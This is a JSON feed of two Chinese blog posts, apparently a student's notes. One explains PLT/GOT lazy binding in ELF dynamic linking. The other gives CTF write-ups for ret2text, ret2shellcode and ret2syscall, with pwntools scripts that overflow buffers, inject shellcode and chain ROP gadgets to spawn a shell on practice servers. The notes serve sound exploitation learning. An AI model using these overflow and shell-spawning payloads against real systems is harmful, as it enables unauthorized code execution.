{
    "version": "https://jsonfeed.org/version/1",
    "title": "3clyの博客 • All posts by \"pwnの学习\" category",
    "description": "一只菜狗的博客",
    "home_page_url": "https://3cly.github.io",
    "items": [
        {
            "id": "https://3cly.github.io/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/",
            "url": "https://3cly.github.io/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/",
            "title": "PLT表与GOT表の延迟绑定机制学习",
            "date_published": "2022-12-30T13:42:08.000Z",
            "content_html": "<h1 id=\"plt表与got表-延迟绑定机制学习\"><a class=\"markdownIt-Anchor\" href=\"#plt表与got表-延迟绑定机制学习\">#</a> PLT 表与 GOT 表 | 延迟绑定机制学习</h1>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<h3 id=\"符号及符号表\"><a class=\"markdownIt-Anchor\" href=\"#符号及符号表\">#</a> 符号及符号表</h3>\n<p>在编程语言中，不可避免的要定义全局变量，函数.<br>\n 在编译器编译源文件的时候，函数名转换为内存地址的引用，未定义的函数名要分配重定位条目，已初始化且初始化不为 0 变量要存入.data 节，初始化为 0 的存入.bss 节，未初始化的则指向 COMMON 伪节中.<br>\n 执行这些操作，需要一个合适的数据结构以组织这些信息和高效的获取数据。于是这一个个的函数名和全局变量名就称为符号，并有序的组织在一起，称为符号表.</p>\n<p>这里做个测试<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221230203518.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221230203826.png\" alt=\"image.png\"></p>\n<p>首先我们来看符号 main 和 func。在源程序中定义了两个函数，分别是函数 main 和函数 func，所以符号表中二者的类型是函数。又函数 main 和 func 是全局可见的，因此这里的 Bind 字段也是全局的 (GLOBAL)。关于 Ndx 表示的是 section 的索引值。关于索引值与具体 section 的对应关系，可以查看 section header table 来确定</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221230204054.png\" alt=\"image.png\"></p>\n<p>又函数 main 和 func 所在的位置是 text section, 所以这里符号 main 和 func 的 Ndx 为 2</p>\n<p>Value (16 进制) 表示函数相对于.text section 起始位置的偏移量 Size 表示所占字节数 由图知函数 func 是从 0 开始，大小是 46 个字节 所以函数 main 的起始地址是 0x2e (46), 紧跟在函数 func 之后 字段 Vis 在 C 语言中没有使用 我们可以忽略这个字段</p>\n<p>关于符号 printf 虽然他也是个函数 但是函数 printf 只是在 main.c 中被引用，由于它的定义并不在 main.c 中，所以它的 Ndx 是 UND (undefine) 的类型</p>\n<p>关于全局变量 count 和 value, 符号表中类型是 OBJECT 表明该符号是个数据对象 (变量和数组等在符号表中的类型都用 OBJECT 来表示) 虽然二者都是全局变量 但二者 Ndx 值不同也就是说二者处于不同的 section 中 导致二者位于不同 section 的原因是 count 经过了初始化，而 value 没有</p>\n<p>main.c 中还定义了一个局部变量 x 这个局部变量没有出现在符号表中，这是因为局部变量在运行时是在栈中被管理，链接器对此类符号并不感兴趣，所以局部变量的信息不会出现在符号表中</p>\n<h3 id=\"动态链接与静态链接\"><a class=\"markdownIt-Anchor\" href=\"#动态链接与静态链接\">#</a> 动态链接与静态链接</h3>\n<p>关于动态链接与静态链接，大佬打了个比方：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p>\n<h4 id=\"静态链接\"><a class=\"markdownIt-Anchor\" href=\"#静态链接\">#</a> 静态链接</h4>\n<p>一段代码从文本编辑器上产生到最终能够在机器上运行，经历了非常多的阶段，概括而言，至少包含了以下几个阶段：</p>\n<ul>\n<li>编译：编译器通过词法分析，语法分析，语义分析等，将一段代码翻译成汇编语言</li>\n<li>汇编：将汇编语言翻译成机器指令</li>\n<li>链接：解决符号之间的重定位问题</li>\n<li>装载：将可执行文件加载到内存</li>\n</ul>\n<p>静态链接就是在装载之前，就完成所有的符号引用的一种链接方式。静态链接的处理过程分为 2 个步骤：</p>\n<ol>\n<li>空间与地址的分配。扫描所有的目标文件，合并相似段，收集当中所有的符号信息。</li>\n<li>符号解析与重定位。调整代码位置。</li>\n</ol>\n<p><strong>静态链接的优缺点</strong></p>\n<ul>\n<li>优点： 简单</li>\n<li>缺点：\n<ul>\n<li>浪费内存空间。在多进程的操作系统下，同一时间，内存中可能存在多个相同的公共库函数。</li>\n<li>程序的开发与发布流程受模块制约。 只要有一个模块更新，那么就需要重新编译打包整个代码。</li>\n</ul>\n</li>\n</ul>\n<p>为了解决以上 2 个问题，就诞生了动态链接。</p>\n<h4 id=\"动态链接\"><a class=\"markdownIt-Anchor\" href=\"#动态链接\">#</a> 动态链接</h4>\n<p>基本思想就是将对符号的重定位推迟到程序运行时才进行。</p>\n<p>只要推迟到运行时进行符号的重定位，就能解决静态链接的两个缺点。</p>\n<p>对于第一个缺点：在运行时重定位，如果在运行过程中调用了公共库函数或者其他模块的函数，系统只需要在内存中维护一份公共库代码即可，只要将不同应用程序对公共库函数的调用地址设置成相同即可。</p>\n<p>对于第二个缺点：理论上只要将需要替换的模块更新，无需将整个应用程序打包。</p>\n<p>对于静态链接来说，系统只需要加载一个文件（可执行文件）到内存即可，但是在动态链接下，系统需要映射一个主程序和多个动态链接模块，因此，相比于静态链接，动态链接使得内存的空间分布更加复杂。</p>\n<h2 id=\"pltgot\"><a class=\"markdownIt-Anchor\" href=\"#pltgot\">#</a> PLT&amp;GOT</h2>\n<p>linux 下的动态链接是通过 PLT&amp;GOT 来实现的</p>\n<p>这里来看一个现成的 c 语言编写的还未链接的.o 文件</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230101185801.png\" alt=\"image.png\"></p>\n<p>printf () 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf () 函数先用 fc ff ff ff 也就是有符号数的 -4 代替</p>\n<p>运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？</p>\n<p>链接器会额外生成一小段代码，通过这段代码来获取 printf () 的地址，像下面这样，进行链接的时候只需要对 printf_stub () 进行重定位操作就可以</p>\n<figure class=\"highlight plain\"><figcaption data-lang=\"plain\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>.text</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>...</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>// 调用printf的call指令</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>call printf_stub</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>...</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>printf_stub:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    jmp rax // 跳过去执行printf函数</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>.data</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>...</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>printf函数的储存地址,这里储存printf函数重定位后的地址</pre></td></tr></table></figure><p>总体来说，动态链接每个函数需要两个东西：</p>\n<p>1、用来存放外部函数地址的数据段</p>\n<p>2、用来获取数据段记录的外部函数地址的代码</p>\n<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>\n<p><img data-src=\"/images/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg\" alt=\"image.jpeg\"></p>\n<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>\n<p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>\n<h3 id=\"延迟绑定\"><a class=\"markdownIt-Anchor\" href=\"#延迟绑定\">#</a> 延迟绑定</h3>\n<p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> printf@<span class=\"token function\">plt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>address_good<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    jmp <span class=\"token operator\">*</span>printf@got   </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>lookup_printf<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    调用重定位函数查找 printf 地址，并写到 printf@got</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">goto</span> address_good<span class=\"token punctuation\">;</span><span class=\"token comment\">// 再返回去执行 address_good</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf () 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到 printf 来执行了</p>\n<p>也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了</p>\n<p>关于这个怎么找的笔记因为测试时候忘记截图了就没贴上来了 下面说些结论</p>\n<p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p>\n<p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共 @plt -&gt; _dl_runtime_resolve</p>\n<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p>\n<p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong></p>\n<p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong></p>\n<p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p>\n<p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>\n<p>流程图:</p>\n<p>第一次调用:</p>\n<p><img data-src=\"/images/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg\" alt=\"image.jpeg\"></p>\n<p>之后再次调用:</p>\n<p><img data-src=\"/images/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg\" alt=\"image.jpeg\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "二进制"
            ]
        },
        {
            "id": "https://3cly.github.io/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/",
            "url": "https://3cly.github.io/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/",
            "title": "基本ROP学习",
            "date_published": "2022-12-15T13:12:06.000Z",
            "content_html": "<p>用 p64 () 发送数据时，是发送的字节流，也就是比特流（二进制流）。</p>\n<h1 id=\"基本-rop学习\"><a class=\"markdownIt-Anchor\" href=\"#基本-rop学习\">#</a> 基本 ROP 学习</h1>\n<p>背景：NX 保护的开启 (No-eXecute, 不可执行保护）</p>\n<p>核心思想：栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>\n<p>ROP 攻击一般得满足如下条件:</p>\n<ul>\n<li>\n<p>程序存在溢出，并且可以控制返回地址。</p>\n</li>\n<li>\n<p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>\n<h2 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h2>\n</li>\n</ul>\n<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p>\n<h3 id=\"pwn1_1\"><a class=\"markdownIt-Anchor\" href=\"#pwn1_1\">#</a> pwn1_1</h3>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220132950.png\" alt=\"image.png\"></p>\n<p>只开了 nx 保护</p>\n<p><code>read()</code>  函数读的数据长度比输入的字符 <code>&amp;buf</code>  的长度长，能够造成溢出</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215211911.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212110.png\" alt=\"image.png\"></p>\n<p>发现后门函数</p>\n<p>利用 ida 计算偏移量</p>\n<p>用返回地址减去起始地址求得偏移量，这里 buf 相对于返回地址得偏移量为 0x18</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220135857.png\" alt=\"image.png\"></p>\n<p>exp 直通后门</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># coding=utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"gxh191.top\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">25537</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sh_addr<span class=\"token operator\">=</span><span class=\"token number\">0x40119E</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sh_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212337.png\" alt=\"image.png\"></p>\n<h3 id=\"pwn2_1\"><a class=\"markdownIt-Anchor\" href=\"#pwn2_1\">#</a> pwn2_1</h3>\n<p>先 checksec 查看保护  只开了 nx 保护<br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212443.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212710.png\" alt=\"image.png\"></p>\n<p>也是栈溢出   read 函数 读 buf 大小 0x1000<br>\n 但是多了个 if 和 strlen 需要用 \\0 来控制字符串长度避免 exit 了<br>\n这是因为 strlen 遇到 \\0 会停止读取，在写脚本时将填充 buf 的字符换成’\\0’即可绕过 strlen 的限制</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220133554.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212829.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212857.png\" alt=\"image.png\"><br>\n 直接跳转到 b4ckd00r 函数会退出运行。因此 2-1 并不能像 1-1 一样直接跳转到 b4ckd00r 就行了 而是需要通过栈溢出跳转到 path<br>\n 脚本如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'gxh191.top'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25540</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">16</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4011EF</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2shellcode\"><a class=\"markdownIt-Anchor\" href=\"#ret2shellcode\">#</a> ret2shellcode</h2>\n<p>ret2shellcode，即控制程序执行 shellcode 代码。</p>\n<h3 id=\"pwn2_2\"><a class=\"markdownIt-Anchor\" href=\"#pwn2_2\">#</a> pwn2_2</h3>\n<p>checksec 查看保护</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220132950.png\" alt=\"image.png\"></p>\n<p>典中典之 NX</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220140613.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220140735.png\" alt=\"image.png\"></p>\n<p>无现成后门可用</p>\n<p><code>mprotect((&amp;phone_number &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);</code></p>\n<p>发现 mprotect 函数修改了 phone_number bss 段的权限</p>\n<p>第三个参数为 7 表示<strong>可读可写可执行</strong></p>\n<p>即思路是将 shellcode 写入 phone_number bss 段 再通过栈溢出来执行</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>io<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'gxh191.top'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25542</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>shellcode<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">16</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040A0</span><span class=\"token operator\">+</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040A0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'ber:'</span><span class=\"token punctuation\">,</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'uf:'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2syscall\"><a class=\"markdownIt-Anchor\" href=\"#ret2syscall\">#</a> ret2syscall</h2>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>\n<p>pop eax 将栈顶数据弹到 eax 里面</p>\n<h4 id=\"以ctfwiki上的例子做一下\"><a class=\"markdownIt-Anchor\" href=\"#以ctfwiki上的例子做一下\">#</a> 以 ctfwiki 上的例子做一下</h4>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227152927.png\" alt=\"image.png\"></p>\n<p>NX 保护</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227152726.png\" alt=\"image.png\"></p>\n<p>gets 栈溢出先用 cyclic 获取偏移量</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227153509.png\" alt=\"image.png\"></p>\n<p>得偏移量 112</p>\n<p>应用程序调用系统调用的过程是：</p>\n<pre><code>把系统调用的编号存入 EAX；\n把函数参数存入其它通用寄存器；\n触发 0x80 号中断（int 0x80）。\n[sys_execve系统调用号是11也就是0xb]\n</code></pre>\n<p><strong>Syscall 的函数调用规范为</strong>： <code>execve(“/bin/sh”, 0,0)</code> ;</p>\n<p>所以，<strong>eax</strong> = 0xb | <strong>ebx</strong> = address of ‘/bin/sh’ | <strong>ecx</strong> = 0 | <strong>edx</strong> = 0</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227153810.png\" alt=\"image.png\"></p>\n<p>payload=b’a’*112+p32(pop_rax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)</p>\n<p>用 ROPgadget 获取一些命令片段的地址</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227154902.png\" alt=\"image.png\"></p>\n<p>先找 eax</p>\n<p><code>0x080bb196 : pop eax ; ret</code>  这个可以用</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227155404.png\" alt=\"image.png\"></p>\n<p><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p>\n<p>可以用 3 个寄存器都有了</p>\n<p>再找’/bin/sh’字符串和 int 0x80</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227155727.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227155827.png\" alt=\"image.png\"></p>\n<p>都找到了 可以写 exp 了</p>\n<p><code>from pwn import * p=process(' ./rop') int_addr=0x8049421 bin_addr=0x80be408 pop_other_ret=0x806eb90 pop_eax_ret=0x80bb196 payload=b'a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr) p.sendline(payload) p.interactive()</code></p>\n<p>运行一下 成功本地 get shell</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227161008.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221211175742.gif\" alt=\"image.gif\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "二进制"
            ]
        }
    ]
}